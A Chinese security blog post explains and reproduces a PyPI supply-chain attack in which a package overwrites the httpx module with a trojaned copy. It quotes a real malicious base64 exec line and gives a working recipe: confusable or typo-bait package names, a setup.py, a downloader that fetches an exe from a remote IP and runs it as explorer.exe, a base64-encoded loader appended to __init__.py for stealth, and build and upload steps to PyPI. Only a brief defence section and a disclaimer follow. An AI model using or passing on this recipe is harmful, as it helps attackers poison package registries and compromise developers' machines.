#  PyPI供应链攻击之模块替换（含原理和复现）   
原创 网络保安29  红蓝攻防研究实验室   2024-02-21 19:11  
  
**0x01 攻击发现**  
  
最近看到我司某实验室的一篇文章(https://tianwen.qianxin.com/blog/2024/02/05/pypi-trojan)，在2024年2月，发现有攻击者开始利用Python包名和模块名不一致的特性，在Python包中添加常见的模块，如requests。新添加的模块会替换原有同名模块，导致用户使用时导入含有恶意代码的模块而被攻击。在发现的可疑的软件包中，包含了常见的模块httpx,requests，这些模块中的文件与官方模块中的文件基本一致，除了在模块初始化文件__init__.py中加入的一段Base64代码：  
```
#updat-httpx/httpx/__init__.py
...
import base64; import requests; import subprocess; import threading; import os; exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgc3VicHJv......DQo='))
```  
  
这段Base64解码之后是一段Python代码，实现从C2下载一个木马程序并命名为explorer.exe，然后启动新线程执行这个程序。  
  
  
**0x02 攻击原理**  
  
PyPI（Python Package Index），是Python编程语言的官方软件包索引。它是一个用于存储和分发Python第三方库的在线资源库，任何人都可以在PyPI上下载第三方库或上传自己开发的库。  
  
在PyPI中，包的名字必须是唯一的，不允许不同作者发布同名的软件包，但允许不同的软件包中包含相同的模块名。由于一个PyPI包可以包含多个模块的，所以攻击者可以构建一个恶意的包，在里面包含一个与httpx同名但__init__.py文件被篡改过的模块，当用户安装恶意的包时，里面的httpx模块也会被解压释放到site-packages目录下。如果用户之前下载过httpx模块，那么原来site-packages下的httpx目录就会被覆盖，导致模块替换。  
  
为什么攻击者要篡改__init__.py文件？这是因为每次从一个包中导入模块时，都会调用包目录下的__init__.py文件。这个文件可以作为包的标识，Python 中的目录只有包含了一个名为 __init__.py的文件才会被认作是一个包。这个文件可以是空的，也可以包含 Python 代码。这个文件也可以用来初始化代码，由于每次导入包时，__init__.py 都会被执行，所以可以在这里做一些准备工作，比如初始化包所需的资源，或者设置包里模块的默认值等。将恶意代码加入__init__.py文件中，可以导致每次引入包中的模块时触发恶意代码。  
  
所以当模块替换发生后，用户每一次调用httpx模块，都会导致httpx目录下的__init__.py中的恶意代码执行。  
  
  
**0x03攻击复现**  
  
以替换httpx模块为例进行供应链攻击复现。  
  
首先去PyPI官网下载httpx的包，解压后删除如下几个文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSfia4FqulNIpVD5Ngg1fT7hNXwv7wqNtFyMm7A6anKKbeFS89fiaa3nicNrutJgd1uWJe4ibAu0qftxA/640?wx_fmt=png&from=appmsg "")  
  
然后给这个包起个名字，例如httpx2.0这种容易让人混淆去安装的，或httpc这种容易手抖输错的。自己再去生成README文件、LICENSE文件、setup.py文件，可以参考这篇文章：https://blog.csdn.net/m0_59596937/article/details/132797213  
  
setup.py文件需要包含httpx目录，也可以使用find_packages() 函数来查找包含当前目录下的所有包。内容示例：  
```
#setup.py
from distutils.core import setup
from setuptools import find_packages

with open("README.rst", "r") as f:
  long_description = f.read()

setup(name='qaxtest-httpx',  #包名
      version='1.1.3',  #版本号
      description='A small example package',
      long_description=long_description,
      author='qwe',
      author_email='qwe@qq.com',
      url='',
      install_requires=[],
      license='BSD License',
      packages=['httpx'],
      platforms=["all"],
      classifiers=[
'Intended Audience :: Developers',
'Operating System :: OS Independent',
'Natural Language :: Chinese (Simplified)',
'Programming Language :: Python',
'Programming Language :: Python :: 2',
'Programming Language :: Python :: 2.7',
'Programming Language :: Python :: 3',
'Programming Language :: Python :: 3.5',
'Programming Language :: Python :: 3.6',
'Programming Language :: Python :: 3.7',
'Programming Language :: Python :: 3.8',
'Programming Language :: Python :: 3.9',
'Topic :: Software Development :: Libraries'
      ],
      )
```  
  
编写一段py代码，模拟远程下载启动木马程序（这里用远程计算器程序替代）：  
```
import requests
import subprocess
import threading
import os

path = os.environ["USERPROFILE"] + "\AppData\Local\explorer.exe"

def process() -> None:
if os.path.exists(path):
        subprocess.run(path, shell=True)

def download() -> None:
    response = requests.get("http://xx.xx.xx.xx/calc.exe")

if response.status_code != 200:
        exit()

with open(path, 'wb') as file:
        file.write(response.content)

def execute() -> None:
    thread = threading.Thread(target=process)
    thread.start()

download(); execute()
```  
  
然后将这段代码转为base64格式：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSfia4FqulNIpVD5Ngg1fT7hmxsPMgtURPqdmNMB7dpoibepBJmuOm2wPrQvtth6LOtLyFiaiaIT09zicQ/640?wx_fmt=png&from=appmsg "")  
  
然后将如下代码追加到httpx目录下的__init__.py文件末尾中，这样可以在不影响httpx库正常初始化的情况下执行恶意代码，增加隐蔽性：  
```
#__init__.py
......
import base64; import requests; import subprocess; import threading; import os; exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IG9zCgpwYXRoID0gb3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSArICJcQXBwRGF0YVxMb2NhbFxleHBsb3Jlci5leGUiCgpkZWYgcHJvY2VzcygpIC0+IE5vbmU6CiAgICBpZiBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICBzdWJwcm9jZXNzLnJ1bihwYXRoLCBzaGVsbD1UcnVlKQoKZGVmIGRvd25sb2FkKCkgLT4gTm9uZToKICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KCJodHRwOi8vMTA3LjE0OC4xLjQxOjgwNzcvY2FsYy5leGUiKQoKICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlICE9IDIwMDoKICAgICAgICBleGl0KCkKCiAgICB3aXRoIG9wZW4ocGF0aCwgJ3diJykgYXMgZmlsZToKICAgICAgICBmaWxlLndyaXRlKHJlc3BvbnNlLmNvbnRlbnQpCgpkZWYgZXhlY3V0ZSgpIC0+IE5vbmU6CiAgICB0aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1wcm9jZXNzKQogICAgdGhyZWFkLnN0YXJ0KCkKCmRvd25sb2FkKCk7IGV4ZWN1dGUoKQ=='))
```  
  
然后就需要将构建的恶意包进行打包，在包目录下执行如下命令进行包的构建：  
  
python3 -m pip install --user --upgrade setuptools wheel  
  
python setup.py sdist build  
  
结束后，在当前目录的dist文件夹下, 会生成一个tar.gz结尾的包。接下来需要将这个包上传到pypi上。  
  
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSfia4FqulNIpVD5Ngg1fT7hplmvKkqrBEfhv1bdavPkwMfUrhGoHU3BjziaXVqUYpDDOLbB0uXRGMg/640?wx_fmt=png&from=appmsg "")  
  
  
首先需要在https://pypi.org/注册一个账号，并完成邮箱验证、双因素验证，获取api token，这个大家自行百度吧。  
  
将获取的token保存好之后，需要在用户目录下创建一个.pypirc文件，里面写好认证相关信息，就可以避免每次上传包时输入验证信息了。username都是_token_，password就是上面拿到的token。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSfia4FqulNIpVD5Ngg1fT7hQYZwbp8nyJXrvdIw1Ip32rKGf2JgTLLSZricC4Nwv6MHwEOlnEBrPNQ/640?wx_fmt=png&from=appmsg "")  
  
接下来，将生成的包上传到pypi。首先需要pip install twine安装twine，然后twine upload 文件路径 来上传包文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSfia4FqulNIpVD5Ngg1fT7hibOSD8icsxfMibqKcbn1DYyezYXZicMiaJ7V4c6zib51GsDlbibLDvRCqyZlA/640?wx_fmt=png&from=appmsg "")  
  
在pypi上可以看到上传成功：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSfia4FqulNIpVD5Ngg1fT7hpqLGBKNkHDiaCtPC3FohjyAXlsuE2XvsLoh5ffI9BlWufUUjET3KB9Q/640?wx_fmt=png&from=appmsg "")  
  
首先安装真正的httpx，可以关注httpx文件的修改时间：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSfia4FqulNIpVD5Ngg1fT7hr1v2xgnVEUZmmIINRc7IicaCyryiakOvrHLRHuF3bvJQS8KDGWGM2Htw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSfia4FqulNIpVD5Ngg1fT7hYqWYiaCROVmfMmDRp1xIF6tYJpffUSxBEjtQdlaHIf9oJ8tbwvOd45g/640?wx_fmt=png&from=appmsg "")  
  
随后模拟用户安装我们的恶意包：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSfia4FqulNIpVD5Ngg1fT7hfDzYfa1kzp3zRgSe2Yia5Cdjqib3vTe83faklpdRJLt8fjxCOO3zO6Gg/640?wx_fmt=png&from=appmsg "")  
  
再观察httpx文件的修改时间，发现原来的httpx模块文件被覆盖了：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSfia4FqulNIpVD5Ngg1fT7hof4haGlicqPAJhxbpmcWpBKl2tkvJkC9wUWweib8QkuVjibdufyYov1Cw/640?wx_fmt=png&from=appmsg "")  
  
接下来引用一下httpx模块，后门触发，远程文件被下载执行：  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSfia4FqulNIpVD5Ngg1fT7hCKHjGlG0Rpjn0zoJKBreUV1XvJ5R79FjsJB2S37l0Wpo1TqPBDSvicQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibSfia4FqulNIpVD5Ngg1fT7h7aXwXF485iab6spX77ofYnwibD1NjOGgbq5rpQlurJS4Fn9X4LGGcibWw/640?wx_fmt=png&from=appmsg "")  
  
  
**0x04 攻击防御**  
  
这种攻击手法在实战攻防中其实并  
不  
常见，多见于APT及  
灰黑产。这种攻击隐蔽性比较高，可以长期潜伏，对于Python特性不太熟悉的用户甚至无法察觉自己被攻击了。建议大家多锻炼身体，保护眼睛，不要手抖或者看岔，尤其是pip安装python包的时候。  
  
说正经的，笔者拙见，这种攻击手段在遭受攻击的初始阶段是很难发现的，但是在触发阶段，可以监控python进程的一些异常行为，但是对于互联网企业来说，开发、运维、测试等人员机器上的python每天可能要执行很多脚本，从这么多的行为中发掘异常行为也是一个难点。此类攻击虽然难发现，但是可以从源头预防，例如建立企业私有的、受控的包索引，供开发测试人员使用，而非使用公开的PyPI。  
  
  
**本文内容仅用于研究****学习，不可用于网络攻击等非法行为，否则造成的后果均与本文作者和本公众号无关，维护网络安全人人有责~**  
  
